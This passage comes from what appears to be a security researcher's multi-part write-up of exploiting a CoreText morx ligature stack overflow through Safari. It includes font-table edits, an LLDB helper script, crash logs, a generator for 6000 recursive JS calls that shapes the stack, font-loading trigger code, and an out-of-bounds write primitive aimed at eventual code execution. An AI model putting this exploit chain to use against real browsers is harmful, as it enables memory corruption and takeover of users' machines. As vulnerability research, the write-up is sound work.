  | Store: 0
  | Offset: fffffeab
  |--
  | bffffead
  | Last: 1
  | Store: 0
  | Offset: fffffead
  |--
  

So now we know where to overwrite. We need to fill this **ligature subtable** with many **ligature actions** (with `Store` flag set) to overflow the array on the stack. Inspecting in Hex Fiend (with a simple CTRL+F), this **ligature subtable** starts at `3C3EA` in the ttf file, and **ligature actions** table starts at `3C5E8`.

It is not sufficient just to overwrite the **ligature actions table** , there are a few other conditions checked by the program, and if any fails, it will break from the loop and we will no longer have any overflow.

Firstly, as we want to extend this **ligature subtable** with many **ligature actions** , it will definitely overwrite the subtables that come after it. In order for the program to not detect this font as corrupted, we should make this the **last** subtable in the morx chain. As this is the **6th** subtable, we update the morx chain to have only **6** subtables instead of **9**.

Here are the other changes made to this subtable’s header:
  
  
  0_poc_crash  22-02-15 17:43 diff original.hdr poc.hdr
  4c4
  < | Length: 600
  ---
  > | Length: 6248
  15,16c15,16
  < | Components offset: 550
  < | Ligature list offset: 576
  ---
  > | Components offset: 4352
  > | Ligature list offset: 4352
  

The above increases the size of the subtable, and changes the offset of the **component table** (CT) and **ligature list** (LL) to somewhere much later in the subtable. This is because we are extending the **ligature actions table** with more stuff, and it will overwrite these 2 other tables (CT and LL).

These 2 tables are not useless! They will be accessed with some index based on the current **ligature action** processed in the loop, and then some computation will be done with the value retrieved, followed by some comparison. If the comparison fails, the loop will be exited as well.
  
  
  while(1) {
  // ...
  
  // the component table index is calculated based on the current glyph's ID and the current ligature action
  // ligature action & 0x3fffffff gives the offset for the glyph ID
  // (4 * lig_action_entry) >> 2 is just removing the 2 most significant bits of lig_action_entry
  component_index = glyph_id + ((4 * lig_action_entry) >> 2);
  p_component_entry = &component_table[component_index];
  
  // ...
  
  // do bounds check, make sure it is within the ligature subtable
  if ( ligature_subtable_start > p_component_entry
  || ligature_subtable_end < &component_table[component_index + 1] )
  {
  break;
  }
  
  // ligature list index is then calculated based on the component table value
  // the component table value is accumulated throughout the loop
  lig_index = __ROL2__(*p_component_entry, 8) + accumulated_component_entry;
  // ...
  
  // if the current ligature action is a store action
  if ( lig_action_entry >= 0x40000000 )
  {
  // take from the ligature list and do bounds check, make sure it is within the ligature subtable
  p_lig_table_entry = &lig_table[lig_index];
  if ( ligature_subtable_start > p_lig_table_entry
  || ligature_subtable_end < &lig_table[(unsigned int)lig_index + 1] )
  {
  break;
  
  // ...
  

As seen in the code excerpt above, the loop will `break` if the **component table index** or **ligature list index** goes beyond the whole ligature subtable. Both needs to be addressed, the **ligature action** must have an appropriate value for the offset field (preferably as small as possible, e.g. 0 or 1), and the same for the **component table** entries, so that when they are used as an index, it won’t go out of the **ligature subtable** ’s bounds. It is fine for the **ligature list** to contain any value. They are merely used to update the rendered glyphs, which is not important here.

It is easier to fix the **component table** , so I do that first. I found that it is very safe to fill the table with a lot of `\x01` bytes (from `3D4E0` to `3D660`), because any access into the **ligature list** with `0x1` as index will definitely fit within the bounds. It is also fine to let the **ligature list** share the same table. That’s why in the modified subtable header as shown above, both tables have the same offset (`4352`).

Now comes the harder part: fixing the **ligature action** s’ offset field. Here’s why the values need to be fixed. They are used to calculate an index into the component table, with `component_index = glyph_id + action_offset`. This `glyph_id` is a unique value for each text character defined in the [cmap table](https://developer.apple.com/fonts/TrueType-Reference-Manual/RM06/Chap6cmap.html), just like how ASCII works. Here’s a concrete example, say we have a sequence of characters “BEEF”, and this function is currently processing a ligature starting from “B”.

  1. It will calculate the `component_index` by adding the glyph ID of “B” with the current ligature action’s offset field.
  2. If the resulting `component_index` is not out of bounds, it will read from the component table, and so on, as described in the previous paragraph.
  3. Then, it moves on to the next ligature action, and the next character, “E”, repeating **step 1**.
  4. It continues until some condition fails, e.g. a. reaching a ligature action with `Last` flag set, or b. the index for the component table goes out of bounds, or c. the index for the ligature list goes out of bounds

4a is easily controlled by just not setting the `Last` flag, and 4c by filling up the component table with `\x01`s as described earlier. For 4b, we can either control the `glyph_id` or `action_offset` to make `component_index` not go out of bounds. Controlling the `glyph_id` is definitely not preferable, because the mappings are stored in the CMAP table, which means there’s another table to deal with. And actually I don’t even want to touch the text/glyphs because I can’t even type Arabic. It is way easier to just calculate a “good” offset value for each ligature action, that keeps the component table index within bounds.

Anyway, I had a way to automate things. I wrote a handy command in LLDB that sets a breakpoint, continues execution over that point a number of times, while performing some calculations and printing the ideal value for the offset field on each iteration through the ligature actions. (Honestly, this code is really long and wouldn’t make much sense without knowing the context of using it, so just skip it. I just attached it in case anyone is curious.)
  
  
  def __lldb_init_module(debugger, internal_dict):
  # ...
  ci.HandleCommand("command script add -f lldbinit.cmd_aa aa", res)
  ci.HandleCommand("command script add -f lldbinit.cmd_aaa aaa", res)
  # ...
  
  ## usage: aa
  ## set some breakpoints and call `aaa` to iterate and find a suitable value for 278 ligature actions
  def cmd_aa(debugger, command, result, _dict):
  def exec(cmd):
  res = lldb.SBCommandReturnObject()
  debugger.GetCommandInterpreter().HandleCommand(cmd, res)
  
  # this might be needed because mbp might not work right at the start
  exec("b DoLigatureAction")
  exec("c")
  exec("bpc 1")
  
  # `mbp <module name> <ida default mapped address>` will create a breakpoint at the module with the address taken from ida
  exec("mbp CoreText 00007FFF21984B47")  # right at the end of `component_index = glyph_id + ((4 * lig_action_entry) >> 2)`
  
  exec("bpd")  # disable all breakpoints
  exec("bpe 2")  # enable breakpoint 2 (mbp CoreText 00007FFF21984B47)
  exec("aaa 278")  # automate fixing 278 ligature actions with a good offset
  
  # usage: aaa <num of ligature actions to iterate>
  # automate fixing component index for n iterations in the loop
  # print out all the ligature actions at the end
  def cmd_aaa(debugger, command, result, _dict):
  def exec(cmd):
  res = lldb.SBCommandReturnObject()
  debugger.GetCommandInterpreter().HandleCommand(cmd, res)
  
  def reg(r):
  return int(str(get_frame().reg[r].value), 16)
  
  n = 1
  args = command.split(' ')
  if len(args) > 0:
  n = int(args[0])
  
  # hide the context
  global CONFIG_NO_CTX
  CONFIG_NO_CTX = 1
  res = ""
  for _ in range(n):
  exec("c")
  
  # rbx = ligature action entry
  rbx = reg("rbx")
  # r14 = calculated component index
  r14 = reg("r14")
  # calculate an offset for ligature action such that the calculated component index == 0
  val = (rbx + 0x100000000 - r14) & 0xffffffff
  
  # 0x80000000 means it's the last action. dont want that
  # here we make sure the component table index is either 0 or -1, negative index won't break the loop
  if val == 0x80000000:
  # not able to make component index == 0 because it needs ligature action to be 0x80000000
  # make component index == -1 instead because that's ok too
  val = 0x7fffffff
  update_register("r14", "0xffffffff")
  else:
  update_register("r14", "0")
  
  res += f"{val:x}"
  print(res)
  
  # show the context
  CONFIG_NO_CTX = 0
  
  exec("mbp CoreText 00007FFF21984C02")
  exec("c")
  exec("context")
  

Running the `aa` command in LLDB will give the following output:
  
  
  (lldbinit) aa
  
  # ...
  
  7ffffea67ffffeab7ffffe947fffff0c7ffffe947fffffff7fffffff7fffffff7fffffff7fffffff... (278 ligature actions)
  
  # ...
  
  Process 92424 stopped
  * thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x7ffee4ce3ec0)
  frame #0: 0x00007fff21ab9b16 CoreText`bool TAATMorphSubtableMorx::DoLigatureAction<TRunGlue::TGlyphInSingleRun>(TRunGlue&, unsigned short, TAATMorphSubtableMorx::MorxLigatureState*, MorphActionResultCode&) + 410
  Target 0: (com.apple.WebKit.WebContent) stopped.
  

Good that it crashed in `TAATMorphSubtableMorx::DoLigatureAction` with `EXC_BAD_ACCESS`, at the address corresponding to the line marked with `[*]` in the following snippet:
  
  
  stack_top = morx_ligature_state->stack_top;
  trunglue = morx_ligature_state->tglyphs[stack_top].trunglue;  // [*]
  location = morx_ligature_state->tglyphs[stack_top].location;
  glyph_id = trunglue->glyphs[trunglue->encoded_index + location];
  
  // we have seen this code earlier!
  component_index = glyph_id + ((4 * lig_action_entry) >> 2);
  p_component_entry = &component_table[component_index];
  

We were indeed expecting an overflow in the stack, but why crash here? I will explain later. But first let me share some notes about the LLDB setup.

### LLDB setup for debugging the POC

As mentioned earlier, the POC is an `index.html` file. With `python3 -m http.server`, I can access http://localhost:8000/index.html on Safari to trigger the bug.

What I always like to do first is `mv index.html index2.html` so that `index.html` does not exist on the HTTP server. This is because I want to [know the PID of the tab](https://osxdaily.com/2014/09/10/show-process-id-page-title-safari-mac-osx/) and then attach LLDB to the tab. Since `index.html` doesn’t exist, the server will give error 404, and I can then attach to the tab process with LLDB. If the tab loads `index.html` before I attach LLDB to it, it will crash immediately because that’s what the POC is supposed to do. Btw, if you only have 1 tab open in Safari, it won’t show the PID, so make sure there are 2 tabs open.

After getting the tab to show an error 404 page and getting the PID (e.g. `92615`), I start LLDB with the PID (`sudo lldb -p 92615`). It will take maybe 10 seconds for LLDB to attach to the tab process. Meanwhile, I do `mv index2.html index.html` to get the POC ready, and refresh the page once LLDB is ready.

Once LLDB is ready, call the `aa` command that was shown above, and it will iterate through the **ligature action** loop as described above. It will show the context panel with the instruction `mov r12, qword ptr [rsi + rdx]`. Actually, the tab has crashed at this point. I don’t know why LLDB doesn’t show the crash message. For the crash message to appear, just call `c` again.

That’s all, now I will explain the crash.

### How did the crash happen?

The crash happened in `TAATMorphSubtableMorx::DoLigatureAction` at:
  
  
  stack_top = morx_ligature_state->stack_top;
  trunglue = morx_ligature_state->tglyphs[stack_top].trunglue;
  

Recall the `MorxLigatureState` structure:
  
  
  struct MorxLigatureState
  {
  TGlyph tglyphs[0x80];  // this is the component stack
  int stack_top;  // index of the top of the stack
  int max_stack_size;  // the maximum stack size reached (because there will be popping from the stack too)
  ...
  }
  

This is the stack trace:

  * `TAATMorphSubtableMorx::DoLigatureAction` (everything above is happening here)
  * `TAATMorphSubtableMorx::DoLigatureSubtable`
  * `TAATMorphSubtableMorx::ProcessT` (`morx_ligature_state` is a local variable here)

So, what happened was, the overflow was successful, as done by the following code in `TAATMorphSubtableMorx::DoLigatureAction`:
  
  
  __int64 storage_index;
  // ...
  TGlyph tglyph_storage[128];
  __int64 canary;
  // end of stack
  
  // ...
  
  &tglyph_storage[storage_index].trunglue = trunglue;
  &tglyph_storage[storage_index].location = location;
  // ...
  storage_index++;
  

After processing 276 ligature actions, it would have pushed 276 `TGlyph`s into the storage array. But the array is only allocated the size of 128 `TGlyph`s. So it will overwrite everything in the next stack frame (`TAATMorphSubtableMorx::DoLigatureSubtable`), and furthermore the next one (`TAATMorphSubtableMorx::ProcessT`), until it overwrites `morx_ligature_state.stack_top` stored in that stack frame.

The `stack_top` field (4-bytes wide) is overwritten with a `TRunglue*` pointer, an address on the stack. As the address is from the stack, it is in the form `00007FFE????????`. Only the most significant 4 bytes (`0x00007ffe`) matter, because that’s what `stack_top` will contain, the remaining least significant 4 bytes (`????????`) will be written to `max_stack_size` which is not useful.

Back to the line that caused the crash:
  
  
  trunglue = morx_ligature_state->tglyphs[stack_top].trunglue;
  

Because `stack_top` is `0x7ffe`, the program accesses unmapped memory, and GG.

### All the ideas don’t work, except one

Obviously, this is not exploitable. You may have many ideas:

**Q:** Don’t process so many (278) **ligature actions**. Just overwrite the canary and return address, then stop there and return.

**A:** The program will overwrite the canary with a `TRunglue*` pointer, which definitely can’t be controlled at all to be a valid canary. Also the return address will be overwritten with a `location` value, which is the index of the current glyph being processed, so it will be very small.

**Q:** Can you overwrite the `stack_top` with something other than `0x7ffe`?

**A:** Nope, as shown above, it must take an address from the stack, which is either `0x7ffe` or `0x7fff` (very rarely).

**Q:** Can you skip the `stack_top` to not overwrite it?

**A:** Nope. Can’t skip anything, only can stop iterating (i.e break out of the loop with a `Last` ligature action).

**Q:** Anything else to overwrite before reaching `stack_top`?

**A:** I checked and could not find any variables in the previous stack frame other than `morx_ligature_state` that are used in this function.

But, there is one idea that Peter gave. Trigger this bug in the context of Safari or Preview, as there will be a lot of things on the stack. Because I don’t really want to deal with the trouble of working with PDF files, I chose Safari. So, my next goal is to allocate many things on the stack such that `morx_ligature_state->tglyphs[0x7ffe]` accesses a value that I can control, and then I see what I can do from there.

**Part 3b** will explain how I do that using JS. **Part 3c** is about achieving OOB write through a certain code path. **Part 3d** is about overcoming more restrictions on the values due to pointer tagging by using wasm. **Part 3e** is about overwriting a vtable to gain code execution.

## Part 3b : Exploit-Control-Stack

_In this section, I share about the possible ways to exploit a vulnerability in the text shaping framework through Safari._

In **part 3a** , the program crashes because of an access to `morx_ligature_state->tglyphs[0x7ffe]` which is beyond mapped memory. In this part, I will describe how to allocate enough stack frames before the crashing function, so that it accesses a value we control, through some JS code in Safari.

### Attempt 1 (fail): By making many nested HTML elements

_The code for this idea is inside`poc/experiments/layout_blocks`._

My first idea was not successful, but I will still describe it here anyway. I tried nesting many HTML elements, with the innermost element containing Arabic text, like this:
  
  
  <!DOCTYPE html>
  <html lang="ar" dir="rtl">
  <head><meta charset="UTF-8"/></head>
  <body>
  <div><div><div><div><div>من ويكيبيديا، الموسوعة الحرة</div></div></div></div></div>
  </body>
  </html>
  

Then, I set a breakpoint at the crashing function `TAATMorphSubtableMorx::DoLigatureAction` to see if it gets called, and see how many stack frames come before it.

Through some experimentation, I discovered that the stack will go up (to a lower address) by `0x1e0` bytes for each nested `<div>`. In the example above with 5 nested `<div>`s, there will be 5+3 recursive calls of `WebCore::RenderBlockFlow::layoutBlock` and `WebCore::RenderBlock::layout`. This only works for `<div>`, other tags like `<span>` or `<p>` don’t produce the same effect.
  
  
  (lldbinit) bt
  * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00007fff21ab997c CoreText`bool TAATMorphSubtableMorx::DoLigatureAction...
  frame #1: 0x00007fff21ab31e1 CoreText`bool TAATMorphSubtableMorx::DoLigatureSubtable...
  frame #2: 0x00007fff21ab277b CoreText`... TAATMorphSubtableMorx::ProcessT...
  ...
  frame #16: 0x000000010d869040 WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 2800
  frame #17: 0x000000010bb555ca WebCore`WebCore::RenderBlock::layout() + 42
  frame #18: 0x000000010d86a00d WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 6845
  frame #19: 0x000000010bb555ca WebCore`WebCore::RenderBlock::layout() + 42
  frame #20: 0x000000010d86a00d WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 6845
  frame #21: 0x000000010bb555ca WebCore`WebCore::RenderBlock::layout() + 42
  frame #22: 0x000000010d86a00d WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 6845
  frame #23: 0x000000010bb555ca WebCore`WebCore::RenderBlock::layout() + 42
  frame #24: 0x000000010d86a00d WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 6845
  frame #25: 0x000000010bb555ca WebCore`WebCore::RenderBlock::layout() + 42
  frame #26: 0x000000010d86a00d WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 6845
  frame #27: 0x000000010bb555ca WebCore`WebCore::RenderBlock::layout() + 42
  frame #28: 0x000000010d86a00d WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 6845
  frame #29: 0x000000010bb555ca WebCore`WebCore::RenderBlock::layout() + 42
  frame #30: 0x000000010d86a00d WebCore`WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) + 6845
  frame #31: 0x000000010bb555ca WebCore`WebCore::RenderBlock::layout() + 42
  ...
  

As each recursive call to `layout`+`layoutBlock` pushes the stack up by `0x1e0` bytes, it takes 1092 recursions to push the stack up by `0x7ffe0` bytes (`0x7ffe * 0x10` because each `TGlyph` has `0x10` bytes). This means that `1089` nested `<div>` will push the stack up enough, so that `morx_ligature_state->tglyphs[0x7ffe]` will access something on the stack instead of crashing due to unmapped memory access.
  
  
  (lldbinit) p/x 0x7ffe0/0x1e0
  (int) $2402 = 0x00000444
  (lldbinit) p/d 0x7ffe0/0x1e0
  (int) $2403 = 1092
  

This sounds straightforward enough. But somehow, it doesn’t work. I can’t remember the exact number, but it only works until somewhere around 600 nested `<div>`s. More than that, nothing will even render on the page. I tried many things in CSS like `display: block` and also nesting random things in between the `<div>` like `<span>` or `<p>` but all the ideas don’t work. I first thought this is some limitation in the HTML spec, but it renders well in Chrome and Firefox (???).

Sadly 600+ recursions is far from enough, so at some point I gave up and tried a new idea (which actually is a lot better for the later steps).

### Attempt 2 (success): Recursive JS function calls

_The code for this idea is inside`poc/experiments/funcs`._

I thought, if nested `<div>` don’t work, how about nested JS function calls.
  
  
  <!DOCTYPE html><html lang="ar" dir="rtl">
  <head><meta charset="UTF-8"/></head>
  <body>
  <canvas id="canvas" height="500px" width="500px"></canvas>
  <script>
  function draw0() {draw1()}
  function draw1() {draw2()}
  function draw2() {draw3()}
  function draw3() {draw4()}
  function draw4() {draw()}
  function draw() {
  var ctx = document.getElementById('canvas').getContext('2d');
  ctx.font = '24px serif';
  ctx.fillText('من ويكيبيديا، الموسوعة الحرة', 400, 200);
  }
  draw0()
  </script>
  </body>
  </html>
  

In order to trigger text rendering (which will call the morx functions) from JS, I let it draw the poc text to the canvas after many recursions. And this gives good results. With 6 recursive calls in the JS code above, there are 6+1 recursive calls to `JavaScriptCore`llint_entry` (llint is the Low Level Interpreter in WebKit).
  
  
  (lldbinit) bt
  * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00007fff21ab997c CoreText`bool TAATMorphSubtableMorx::DoLigatureAction...
  frame #1: 0x00007fff21ab31e1 CoreText`bool TAATMorphSubtableMorx::DoLigatureSubtable...
  frame #2: 0x00007fff21ab277b CoreText`... TAATMorphSubtableMorx::ProcessT...
  ...
  frame #15: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #16: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #17: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #18: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #19: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #20: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #21: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #22: 0x000000066037b486 JavaScriptCore`vmEntryToJavaScript...
  frame #23: 0x0000000660a54e08 JavaScriptCore`JSC::Interpreter::executeProgram...
  frame #24: 0x0000000660cee712 JavaScriptCore`JSC::evaluate
  ...
  

Again, I checked the `rsp` values for 2 consecutive frames, and found that each `llint_entry` stack frame is `0x70` tall. So, we need about 4680 levels of recursion in JS to push the stack up by `0x7ffe0` bytes.
  
  
  (lldbinit) p/x 0x7ffe0/0x90
  (int) $11 = 0x00000e38
  (lldbinit) p/d 0x7ffe0/0x90
  (int) $12 = 3640
  

I wrote a script to generate this for me:
  
  
  # gen.py
  fat = ""
  
  n = 6000
  for i in range(n):
  fat += f'function draw{i}() {{draw{i+1}()}}\n'
  fat = fat.replace(f"draw{n}()", "draw()")
  
  js = open("draw.js").read()
  fat += js
  
  with open("index.html", "w") as outf:
  outf.write("<!DOCTYPE html>")
  outf.write('<html lang="ar" dir="rtl">')
  outf.write("<head>")
  outf.write('<meta charset="UTF-8"/>')
  
  outf.write("</head>")
  outf.write("<body>")
  outf.write('<canvas id="canvas" height="500px" width="500px"></canvas>')
  outf.write(f'<script>{fat}</script>')
  outf.write("</body>")
  outf.write("</html>")
  

This generates many JS functions that call another function in the following form:
  
  
  // draw.js
  function draw() {
  var ctx = document.getElementById('canvas').getContext('2d');
  ctx.font = '24px serif';
  ctx.fillText('من ويكيبيديا، الموسوعة الحرة', 400, 200);
  }
  
  function draw6000() {draw()}
  ...
  function draw10() {draw11()}
  function draw9() {draw10()}
  function draw8() {draw9()}
  ...
  function draw0() {draw1()}
  
  draw0()
  

I tried with 6000 levels of recursion, and hope that it doesn’t fail like the nested elements idea. I am pleased that it works!
  
  
  (lldbinit) bt
  * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00007fff21ab997c CoreText`bool TAATMorphSubtableMorx::DoLigatureAction...
  frame #1: 0x00007fff21ab31e1 CoreText`bool TAATMorphSubtableMorx::DoLigatureSubtable...
  frame #2: 0x00007fff21ab277b CoreText`... TAATMorphSubtableMorx::ProcessT...
  ...
  frame #6010: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #6011: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #6012: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #6013: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #6014: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #6015: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #6016: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  frame #6017: 0x000000066037b486 JavaScriptCore`vmEntryToJavaScript...
  frame #6018: 0x0000000660a54e08 JavaScriptCore`JSC::Interpreter::executeProgram...
  frame #6019: 0x0000000660cee712 JavaScriptCore`JSC::evaluate
  ...
  

I calculated the distance between the `morx_ligature_state`’s stack frame with another frame very far from it, and the distance is `0xa75f0`.
  
  
  (lldbinit) frame select 2
  frame #2: 0x00007fff21ab277b CoreText`... TAATMorphSubtableMorx::ProcessT...
  (lldbinit) p/x $rsp
  (unsigned long) $23 = 0x00007ffee55727b0
  
  (lldbinit) frame select 6015
  frame #6015: 0x0000000660396c4e JavaScriptCore`llint_entry + 112071
  (lldbinit) p/x $rsp
  (unsigned long) $24 = 0x00007ffee5619da0
  
  (lldbinit) p/x 0x00007ffee5619da0-0x00007ffee55727b0
  (long) $25 = 0x00000000000a75f0
  

It is a lot more than `0x7ffe0` so it is very good! The next step is to just find out the right level of recursion for me to control the location accessed by `morx_ligature_state->tglyphs[0x7ffe]`.

Currently the stack layout would look like this:
  
  
  +-------------------+
  |  state->tglyphs  |
  +-------------------+
  |  .....  |
  +-------------------+
  | f6000 stack frame |
  +-------------------+
  | f5999 stack frame |
  +-------------------+
  |  .....  |
  +-------------------+
  |  f2 stack frame  |
  +-------------------+
  |  f1 stack frame  |  -- offset +0xa75f0
  +-------------------+
  

### Now add in the poc font

_The code for this part is inside`poc/1_poc_better_crash`._

The example above works well, but it uses the default system font, since we didn’t specify to load the poc font. In order for the canvas to use the poc font, the code in `draw.js` is slightly modified as follows.
  
  
  // https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=474948
  function draw() {
  var ctx = canvas.getContext('2d');
  ctx.font = '24px GeezaPro';
  ctx.fillText('من ويكيبيديا، الموسوعة الحرة', 400, 200);
  }
  
  function load() {
  const pocFontFace = new FontFace("GeezaPro", "url(poc.ttf)");
  
  var canvas = document.getElementById('canvas')
  canvas.setAttribute("style", "font-family: GeezaPro; -webkit-font-smoothing: none;")
  
  pocFontFace.load().then(function(pocFontFaceLoaded) {
  document.fonts.add(pocFontFaceLoaded)
  document.fonts.ready.then(function() {
  draw0()
  })
  })
  }
  
  load()
  

Now, loading this updated version of the webpage will make Safari crash again. But for a different reason:
  
  
  ->  0x7fff21ab9b3e (0x7fff21984b3e): 47 0f b7 5c 55 00  movzx  r11d, word ptr [r13 + 2*r10]
  ...
  Process 97817 stopped
  * thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=2, address=0x19ab0751f0)
  frame #0: 0x00007fff21ab9b3e CoreText`bool TAATMorphSubtableMorx::DoLigatureAction...
  

The corresponding line is the one marked with `[*]` below. This is good. The line at `[1]` no longer crashes due to bad memory access.
  
  
  trunglue = morx_ligature_state->tglyphs[stack_top].trunglue;  // [1] this is where it crashed last time
  location = morx_ligature_state->tglyphs[stack_top].location;
  glyph_id = trunglue->glyphs[trunglue->encoded_index + location];  // [*]
  

In the asm above:

  * `r11d` -> `glyph_id`
  * `r13`=`0x0000000CD302C4F0` -> `&trunglue->glyphs[trunglue->encoded_index]` (`trunglue->glyphs` is a `WORD*`)
  * `r10`=`0x000000066C024680` -> `location`

The program crashes because `r13` and `r10` are just some random values taken from one of the `llint_entry` stack frames. That’s ok for now. The next step is to find out how to control exactly what is loaded into `trunglue` and `location`, and see what can be done from here onwards.

**Part 3c** will describe reaching a certain code path that allows for a relative OOB write on the system malloc heap, and overcoming more restrictions on the values due to pointer tagging by using wasm. **Part 3d** is about overwriting a vtable to gain code execution.

## Part 3c : Exploit-OOB-Write

_In this section, I explore the possibility that I could overwrite a vtable on the heap, so that it is still possible to take over code execution, despite not being able to overwrite the return address on the stack. I was told that this technique was called[Data-Oriented Programming](https://huhong789.github.io/advanced-DOP/) by other researchers. You may likely not be interested in the contents here, unless you face the same situation that I’m facing here. This part is also probably quite messy, although I have tried my best to make it as clear as possible. Also, I decided to be as verbose as possible so that it is easier to understand._

At this point, we have control over 2 values that will be loaded from a much much earlier stack frame. This happens in a `while` loop that stops when the **ligature action** is `0x80000000`.
  
  
  stack_top = morx_ligature_state->stack_top;
  trunglue = morx_ligature_state->tglyphs[stack_top].trunglue;
  location = morx_ligature_state->tglyphs[stack_top].location;
  glyph_id = trunglue->glyphs[trunglue->encoded_index + location];
  

The `stack_top` value will get decremented in each iteration of the loop, as it accesses the “previous” `TGlyph`. To be more precise, this is what happens to `stack_top` (not important for this exploit but in case you are interested):
  
  
  morx_ligature_state->stack_top--;
  if (morx_ligature_state->stack_top < 0)
  morx_ligature_state->stack_top = morx_ligature_state->max_stack_size - 1;
  

The situation now is: `trunglue` and `location` are the only 2 values we control after triggering the overflow. And there is also nothing that we can control after the loop exits. I’ve checked many times, and confirmed that the exploit depends fully on what happens to these 2 values. So, suppose we have control over the values `trunglue` and `location`, what can we do?

### OOB Write Code Path

I found this useful code path. In the loop, a few lines after loading `trunglue` and `location` from the stack, a function is called. As seen below, the name is very long, so I will just call it the lambda function from here onwards.
  
  
  TAATMorphSubtableMorx::DoLigatureAction<TRunGlue::TGlyph>(TRunGlue&,unsigned short,TAATMorphSubtableMorx::MorxLigatureState *,MorphActionResultCode &)::{lambda(void)#1}::operator()`
  

There are a bunch of things happening in here, but there is this useful call chain:

  * lambda function 
  * `TGlyphIterator::DoLigature`
  * `TRunGlue::SetGlyphID<true>`
  * `TStorageRange::SetGlyphID`
  * `objc_msgSend_ptr` \- which actually calls `[_CTNativeGlyphStorage setGlyph:atIndex:]`

`[_CTNativeGlyphStorage setGlyph:atIndex:]` gives a wonderful oob write primitive:
  
  
  _WORD *__fastcall -[_CTNativeGlyphStorage setGlyph:atIndex:](
  __int64 this,
  __int64 a2,
  __int16 ligature_offset,
  __int64 index)
  {
  _WORD *glyphs; // rax
  
  glyphs = this->glyphs;
  glyphs[index] = ligature_offset;  // oob write
  return glyphs;
  }
  

Both `index` and `ligature_offset` are values we control.

  * `index` is `location` (we control this) added/subtracted by some small offset (just 1 or 2)
  * `ligature_offset` is a value taken from the **ligature list**

I looked through all the functions in this code path, and confirmed that there are no bounds checks.

Now, I need to find a way to fully control `trunglue` and `location` that are loaded from the JS stack frame. There are a few ideas that I tried and failed, but I’ll still go through all of them. You can skip to the **Attempt 3 (success)** section if you aren’t interested in the failed ideas.

But before that, here is a short description of how `ligature_offset` is taken from the **ligature list**. In summary, this is what happens:

  1. Obtain **component table** index from the ligature action (the least significant 30 bits of the **ligature action**).
  2. Do bounds check on the **component table** index.
  3. Read the **component value** from the **component table** and accumulate with previous iterations.
  4. Do bounds check on the **ligature offset table**.
  5. Read **ligature offset** from the font file.

  
  
  // [1] obtain component table index from the ligature action
  component_index = ((4 * lig_action_entry) >> 2) + TRunGlue::GetGlyphID(trunglue, location);  // lig action offset
  p_component_entry = &component_table[component_index];
  
  // [2] bounds check on component index
  if ( this->ligature_subtable_start > p_component_entry )
  break;
  if ( this->ligature_subtable_end < &component_table[component_index + 1] )
  break;
  
  // [3] Accumulate
  component_entry += __ROL2__(*p_component_entry, 8);
  ...
  
  // if store bit is set (which is always the case in the POC)
  if ( lig_action_entry >= 0x40000000 )
  {
  p_ligature_offset_entry = &ligature_offset_table[component_entry];
  component_entry = 0;
  
  // [4] bounds check on ligature list table
  if ( this->ligature_subtable_start > p_ligature_list_entry
  || this->ligature_subtable_end < &ligature_list_table[component_entry + 1] )
  {
  break;
  }
  
  ...
  
  // [5] ligature_offset retrieved from the font file
  ligature_offset = __ROL2__(*p_ligature_offset_entry, 8);
  
  ...
  

Recall that in part 3a, I filled an area of the morx table with `\x01` bytes. The **ligature actions** have been chosen to ensure that the **component table** index always result in reading `0x1` as the **component value**. As a result, the **ligature offset table** index will be incremented by just 1 in every iteration.

### Attempt 1 (fail):

_The code for this can be found in`poc/2_poc_oob_write` (with some changes)._

Through some reading and experimentation with JS, I found a simple way to put any values I want onto the stack.
  
  
  function setup(a) {
  var v0 = a[0];var v1 = a[1];var v2 = a[2];var v3 = a[3];var v4 = a[4];var v5 = a[5];
  var v6 = a[6];var v7 = a[7];var v8 = a[8];var v9 = a[9];var v10 = a[10];
  var v11 = a[11];var v12 = a[12];var v13 = a[13];var v14 = a[14];var v15 = a[15];
  var v16 = a[16];var v17 = a[17];var v18 = a[18];var v19 = a[19];var v20 = a[20];
  var v21 = a[10];var v22 = a[10];var v23 = a[10];var v24 = a[10];var v25 = a[10];
  var v26 = a[10];var v27 = a[10];var v28 = a[10];
  draw0();
  return v1 + v2 + v3 + v4 + v5 + v6 + v7 + v8 + v9 + v10 + v11 + v12 + v13 + v14 + v15 + v16 + v17 + v18 + v19 + v20 +
  v21 + v22 + v23 + v24 + v25 + v26 + v27 + v28;
  }
  
  function load() {
  const pocFontFace = new FontFace("GeezaPro", "url(poc.ttf)")
  
  var canvas = document.getElementById('canvas')
  canvas.setAttribute("style", "font-family: GeezaPro; -webkit-font-smoothing: none;")
  
  pocFontFace.load().then(function(pocFontFaceLoaded) {
